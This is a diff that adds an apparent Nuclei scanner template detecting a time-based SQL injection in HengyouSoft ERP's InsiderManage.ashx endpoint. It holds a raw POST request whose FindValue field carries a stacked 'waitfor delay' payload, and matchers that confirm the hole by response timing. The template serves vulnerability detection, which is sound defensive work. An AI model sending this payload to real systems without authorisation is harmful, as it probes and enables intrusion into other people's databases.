@@ -1,0 +1,40 @@
+id: hengyousoft-erp-insidermanage-sqli
+info:
+  name: HengyouSoft ERP InsiderManage.ashx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in HengyouSoft ERP's InsiderManage.ashx endpoint.
+
+variables:
+  t1: '{{rand_int(5, 10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        POST /ashx/InsiderManage.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        Method=Find&ShopID=&FindType=ChildName&FindValue=1%27;waitfor+delay+'0:0:{{t1}}'--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"InsiderList":'
+          - '"ChildName":'
+      - type: word
+        part: body
+        words:
+          - '<'
+        negative: true
+      - type: dsl
+        dsl:
+          - duration > to_number(t1)
+          - duration < to_number(t2)
